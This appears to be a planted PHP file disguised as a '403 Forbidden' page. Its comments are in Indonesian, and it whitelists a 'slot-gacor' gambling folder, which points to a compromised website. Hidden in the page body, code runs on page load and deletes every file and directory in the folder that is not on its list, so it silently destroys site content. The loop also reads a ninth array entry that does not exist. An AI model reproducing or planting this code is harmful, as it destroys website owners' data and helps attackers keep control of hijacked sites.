<!DOCTYPE html>
<html>
<head>
	<title>403 Forbidden</title>
</head>
<body>

<p>Directory access is forbidden.</p>
<?php 
$fileku = array('core','database','fonts','helpers','language','libraries','slot-gacor','index.php'); 
if ($handle = opendir('.')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

						if (
								$entry!=$fileku[0] AND
								$entry!=$fileku[1] AND
								$entry!=$fileku[2] AND
								$entry!=$fileku[3] AND
								$entry!=$fileku[4] AND
								$entry!=$fileku[5] AND
								$entry!=$fileku[6] AND
								$entry!=$fileku[7] AND
								$entry!=$fileku[8]
								 )
						{
							// echo "hapus $entry <br>";
							//file yang tidak sesuai dengan $fileku maka dihapus
							// cek apakah benar ini folder atau bukan
							if (is_dir($entry)) {
								$files = glob("$entry/*");
								foreach($files as $file){
								    $lastModifiedTime = filemtime($file);
								    $currentTime = time();
								    $timeDiff = abs($currentTime - $lastModifiedTime)/(60*60); //in hours
								    if(is_file($file) && $timeDiff > 10) //check if file is modified before 10 hours
								    unlink("$file"); //hapus file
								}
								rmdir("$entry"); //hapus folder
							}else {
								unlink("$entry"); //hapus file
							}

						}

        }

    }

    closedir($handle);
}	
?>
</body>
</html>
